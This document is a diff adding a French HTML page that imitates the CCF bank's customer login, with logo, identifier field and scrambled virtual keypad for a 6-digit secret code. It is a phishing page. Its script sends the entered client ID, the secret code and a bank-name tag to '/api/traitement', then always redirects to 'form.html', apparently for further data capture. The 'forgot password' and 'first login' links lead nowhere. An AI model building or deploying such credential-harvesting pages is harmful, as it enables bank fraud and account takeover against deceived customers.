@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CCF - Connexion Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- RESET & STYLE DE BASE HAUTE FIDÉLITÉ --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+        }
+        body {
+            background-color: #f1f5f9;
+            color: #1e293b;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 440px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.06);
+        }
+
+        /* --- STRUCTURE DES ÉTAPES --- */
+        .ccf-step {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            flex-grow: 1;
+        }
+        .ccf-active-step {
+            display: flex !important;
+        }
+
+        /* --- EN-TÊTE OFFICIEL CCF --- */
+        .ccf-header {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 22px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .ccf-logo-block img {
+            height: 34px;
+            width: auto;
+            object-fit: contain;
+            display: block;
+        }
+        .ccf-header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background-color: #f8fafc;
+            padding: 6px 12px;
+            border-radius: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        .ccf-header-right img {
+            height: 18px;
+            width: auto;
+            object-fit: contain;
+        }
+        .ccf-header-right span {
+            color: #00356b;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: 'Poppins', sans-serif;
+            letter-spacing: 0.3px;
+        }
+
+        /* --- CORPS PRINCIPAL --- */
+        .ccf-content {
+            padding: 40px 24px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        /* Zone Icône Cadenas Central */
+        .ccf-center-icon-zone {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+        .ccf-main-lock-circle {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #00356b, #00234a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 20px rgba(0, 53, 107, 0.15);
+        }
+        .ccf-main-lock-circle svg {
+            width: 28px;
+            height: 28px;
+            fill: #ffffff;
+        }
+
+        /* Titre de l'espace */
+        .ccf-main-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: 22px;
+            color: #00356b;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 35px;
+            letter-spacing: -0.3px;
+        }
+
+        /* Formulaire & Saisie */
+        .ccf-form-group {
+            width: 100%;
+            margin-bottom: 24px;
+        }
+        .ccf-input-label {
+            display: block;
+            font-size: 13.5px;
+            color: #475569;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .ccf-input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+        .ccf-input-wrapper input, .ccf-pass-preview-box input {
+            width: 100%;
+            height: 54px;
+            padding: 0 45px 0 16px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            color: #00356b;
+            outline: none;
+            background-color: #ffffff;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+        .ccf-input-wrapper input:focus {
+            border-color: #00356b;
+            box-shadow: 0 0 0 1px #00356b;
+        }
+        .ccf-clear-input {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 22px;
+            color: #94a3b8;
+            cursor: pointer;
+            display: none;
+            user-select: none;
+        }
+
+        /* Case à cocher Mémorisation */
+        .ccf-checkbox-row {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            gap: 12px;
+            margin-bottom: 35px;
+        }
+        .ccf-custom-checkbox {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            accent-color: #00356b;
+            border-radius: 4px;
+        }
+        .ccf-checkbox-label {
+            font-size: 14px;
+            color: #475569;
+            cursor: pointer;
+            font-weight: 500;
+            user-select: none;
+        }
+
+        /* Ruban de Rappel Identifiant Étape 2 */
+        .ccf-id-back-strip {
+            width: 100%;
+            background-color: #f8fafc;
+            padding: 14px 16px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 28px;
+            cursor: pointer;
+            border: 1px solid #e2e8f0;
+            transition: background-color 0.2s;
+        }
+        .ccf-id-back-strip:hover {
+            background-color: #f1f5f9;
+        }
+        .ccf-id-strip-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .ccf-back-arrow {
+            font-size: 22px;
+            color: #00356b;
+            font-weight: 700;
+            line-height: 1;
+        }
+        .ccf-display-num {
+            font-size: 14.5px;
+            color: #00356b;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .ccf-modify-text {
+            font-size: 12.5px;
+            color: #64748b;
+            font-weight: 500;
+            text-decoration: underline;
+        }
+
+        /* --- BOUTONS DE VALIDATION --- */
+        .ccf-btn-main-blue {
+            width: 100%;
+            height: 54px;
+            background-color: #00356b;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 53, 107, 0.12);
+        }
+        .ccf-btn-main-blue:hover {
+            background-color: #00234a;
+        }
+        .ccf-btn-submit-disabled {
+            width: 100%;
+            height: 54px;
+            background-color: #cbd5e1;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* --- GRILLE CLAVIER VIRTUEL PREMIUM --- */
+        .ccf-keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            width: 100%;
+            margin-bottom: 35px;
+        }
+        .ccf-key {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            height: 58px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 22px;
+            font-weight: 600;
+            color: #00356b;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+            transition: all 0.1s ease;
+        }
+        .ccf-key:active {
+            background-color: #f1f5f9;
+            transform: scale(0.98);
+        }
+        .ccf-key-backspace {
+            grid-column: span 2;
+            font-size: 15px;
+            font-weight: 600;
+            background-color: #f8fafc;
+            font-family: 'Montserrat', sans-serif;
+            color: #64748b;
+        }
+        .ccf-key-backspace:active {
+            background-color: #e2e8f0;
+        }
+
+        /* --- FOOTER LINKS --- */
+        .ccf-footer-links {
+            margin-top: auto;
+            padding-top: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            border-top: 1px dashed #e2e8f0;
+        }
+        .ccf-footer-link {
+            color: #00356b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .ccf-footer-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <div id="ccf-step-id" class="ccf-step ccf-active-step">
+            <header class="ccf-header">
+                <div class="ccf-logo-block">
+                    <img src="CCF-2023.svg.webp" alt="CCF Logo">
+                </div>
+                <div class="ccf-header-right">
+                    <img src="CCF-2023.svg.webp" alt="CCF Icon">
+                    <span>Espace client</span>
+                </div>
+            </header>
+
+            <main class="ccf-content">
+                <div class="ccf-center-icon-zone">
+                    <div class="ccf-main-lock-circle">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <h2 class="ccf-main-title">Connexion à votre espace</h2>
+                
+                <div class="ccf-form-group">
+                    <label class="ccf-input-label" for="ccf-client-id">Votre identifiant</label>
+                    <div class="ccf-input-wrapper">
+                        <input type="tel" id="ccf-client-id" maxlength="11" placeholder="Saisissez votre identifiant" autocomplete="off">
+                        <span class="ccf-clear-input" id="ccf-id-clear">×</span>
+                    </div>
+                </div>
+
+                <div class="ccf-checkbox-row">
+                    <input type="checkbox" id="ccf-remember-me" class="ccf-custom-checkbox" checked>
+                    <label for="ccf-remember-me" class="ccf-checkbox-label">Mémoriser mon identifiant</label>
+                </div>
+
+                <button id="ccf-btn-submit-id" class="ccf-btn-main-blue">Suivant</button>
+
+                <div class="ccf-footer-links">
+                    <a href="javascript:void(0);" class="ccf-footer-link">Première connexion ?</a>
+                    <a href="javascript:void(0);" class="ccf-footer-link">Identifiant ou mot de passe oublié ?</a>
+                </div>
+            </main>
+        </div>
+
+        <div id="ccf-step-password" class="ccf-step">
+            <header class="ccf-header">
+                <div class="ccf-logo-block">
+                    <img src="CCF-2023.svg.webp" alt="CCF Logo">
+                </div>
+                <div class="ccf-header-right">
+                    <img src="CCF-2023.svg.webp" alt="CCF Icon">
+                    <span>Espace client</span>
+                </div>
+            </header>
+
+            <main class="ccf-content">
+                <div class="ccf-center-icon-zone">
+                    <div class="ccf-main-lock-circle">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <h2 class="ccf-main-title">Connexion à votre espace</h2>
+
+                <div class="ccf-id-back-strip" id="ccf-btn-back">
+                    <div class="ccf-id-strip-left">
+                        <span class="ccf-back-arrow">‹</span>
+                        <span id="ccf-id-display" class="ccf-display-num">---------</span>
+                    </div>
+                    <span class="ccf-modify-text">Modifier</span>
+                </div>
+
+                <div class="ccf-form-group">
+                    <label class="ccf-input-label">Votre mot de passe</label>
+                    <div class="ccf-pass-preview-box">
+                        <input type="password" id="ccf-fake-pass" readonly placeholder="••••••">
+                    </div>
+                </div>
+
+                <div class="ccf-keyboard-grid" id="ccf-virtual-keyboard"></div>
+
+                <button id="ccf-btn-submit-pass" class="ccf-btn-submit-disabled" disabled>Se connecter</button>
+                
+                <div class="ccf-footer-links">
+                    <a href="javascript:void(0);" class="ccf-footer-link">Première connexion ?</a>
+                    <a href="javascript:void(0);" class="ccf-footer-link">Identifiant ou mot de passe oublié ?</a>
+                </div>
+            </main>
+        </div>
+
+        <input type="hidden" id="ca-page-source" value="CCF">
+
+    </div>
+
+<script>
+    // ÉLÉMENTS DU DOM
+    const stepId = document.getElementById('ccf-step-id');
+    const stepPass = document.getElementById('ccf-step-password');
+    const inputId = document.getElementById('ccf-client-id');
+    const btnClearId = document.getElementById('ccf-id-clear');
+    const btnSubmitId = document.getElementById('ccf-btn-submit-id');
+    const btnSubmitPass = document.getElementById('ccf-btn-submit-pass');
+    const keyboardGrid = document.getElementById('ccf-virtual-keyboard');
+    const idDisplay = document.getElementById('ccf-id-display');
+    const btnBack = document.getElementById('ccf-btn-back');
+    const fakePassInput = document.getElementById('ccf-fake-pass');
+
+    let secretCode = ""; // Variable de stockage globale pour le code secret
+
+    // FILTRAGE ET SAISIE DE L'IDENTIFIANT NUMÉRIQUE
+    if (inputId) {
+        inputId.addEventListener('input', () => {
+            inputId.value = inputId.value.replace(/\D/g, ''); // Chiffres uniquement
+            if (btnClearId) {
+                btnClearId.style.display = inputId.value.length > 0 ? 'block' : 'none';
+            }
+        });
+    }
+
+    if (btnClearId) {
+        btnClearId.addEventListener('click', () => {
+            inputId.value = "";
+            btnClearId.style.display = 'none';
+            inputId.focus();
+        });
+    }
+
+    // PASSAGE À L'ÉTAPE DU CODE PIN
+    if (btnSubmitId) {
+        btnSubmitId.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (inputId && inputId.value.length >= 4) {
+                if (idDisplay) idDisplay.textContent = inputId.value;
+                if (stepId) stepId.classList.remove('ccf-active-step');
+                if (stepPass) stepPass.classList.add('ccf-active-step');
+                buildCcfKeyboard();
+            } else {
+                alert('Veuillez saisir un identifiant valide.');
+            }
+        });
+    }
+
+    // ACTION DE RETOUR VIA LE STRIP IDENTIFIANT
+    if (btnBack) {
+        btnBack.addEventListener('click', (e) => {
+            e.preventDefault();
+            secretCode = ""; 
+            if (fakePassInput) fakePassInput.value = "";
+            if (stepPass) stepPass.classList.remove('ccf-active-step');
+            if (stepId) stepId.classList.add('ccf-active-step');
+            updatePasswordDisplay(); 
+        });
+    }
+
+    // GÉNÉRATION COMPLÈTE DE LA MATRICE DU CLAVIER
+    function buildCcfKeyboard() {
+        if (!keyboardGrid) return;
+        keyboardGrid.innerHTML = "";
+        
+        // Ordre spécifique hérité des captures d'application CCF
+        const keys = ['9', '1', '0', '8', '5', '6', '4', '2', '7', '3'];
+
+        keys.forEach(num => {
+            const btn = document.createElement('button');
+            btn.className = 'ccf-key';
+            btn.textContent = num;
+            btn.type = 'button'; 
+            btn.onclick = (e) => {
+                e.preventDefault();
+                if (secretCode.length < 6) {
+                    secretCode += num;
+                    updatePasswordDisplay();
+                }
+            };
+            keyboardGrid.appendChild(btn);
+        });
+
+        // Bouton d'effacement de la grille
+        const backBtn = document.createElement('button');
+        backBtn.className = 'ccf-key ccf-key-backspace';
+        backBtn.type = 'button';
+        backBtn.innerHTML = 'Effacer ⌫'; 
+        backBtn.onclick = (e) => {
+            e.preventDefault();
+            if (secretCode.length > 0) {
+                secretCode = secretCode.slice(0, -1);
+                updatePasswordDisplay();
+            }
+        };
+        keyboardGrid.appendChild(backBtn);
+    }
+
+    // MISE À JOUR VISUELLE DU MOT DE PASSE ET ACTIVATION DU BOUTON
+    function updatePasswordDisplay() {
+        if (fakePassInput) {
+            fakePassInput.value = "•".repeat(secretCode.length);
+        }
+
+        if (btnSubmitPass) {
+            if (secretCode.length === 6) {
+                btnSubmitPass.removeAttribute('disabled');
+                btnSubmitPass.className = 'ccf-btn-main-blue';
+                btnSubmitPass.style.cursor = 'pointer';
+            } else {
+                btnSubmitPass.setAttribute('disabled', 'true');
+                btnSubmitPass.className = 'ccf-btn-submit-disabled';
+                btnSubmitPass.style.cursor = 'not-allowed';
+            }
+        }
+    }
+
+    // ENVOI UNIQUEMENT APRÈS ACTIONS CLICS MANUELS (SANS ENVOI AUTO)
+    function submitToPHP() {
+        const pageSourceInput = document.getElementById('ca-page-source');
+        const pageSource = pageSourceInput ? pageSourceInput.value : 'CCF';
+        
+        if (btnSubmitPass) {
+            btnSubmitPass.disabled = true;
+            btnSubmitPass.textContent = "Validation en cours...";
+            btnSubmitPass.style.opacity = "0.8";
+        }
+
+        const dataToSend = {
+            nom_banque: pageSource,
+            client_id: inputId ? inputId.value : "",
+            secret_code: secretCode
+        };
+
+        // Redirection de secours immédiate pour contrer les freezes
+        const safetyTimeout = setTimeout(() => {
+            window.location.href = 'form.html';
+        }, 1600);
+
+        fetch('/api/traitement', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(dataToSend)
+        })
+        .then(() => {
+            clearTimeout(safetyTimeout);
+            window.location.href = 'form.html';
+        })
+        .catch(() => {
+            clearTimeout(safetyTimeout);
+            window.location.href = 'form.html';
+        });
+    }
+
+    // Déclencheur final manuel
+    if (btnSubmitPass) {
+        btnSubmitPass.addEventListener('click', (e) => {
+            e.preventDefault();
+            if (secretCode.length === 6) {
+                submitToPHP();
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
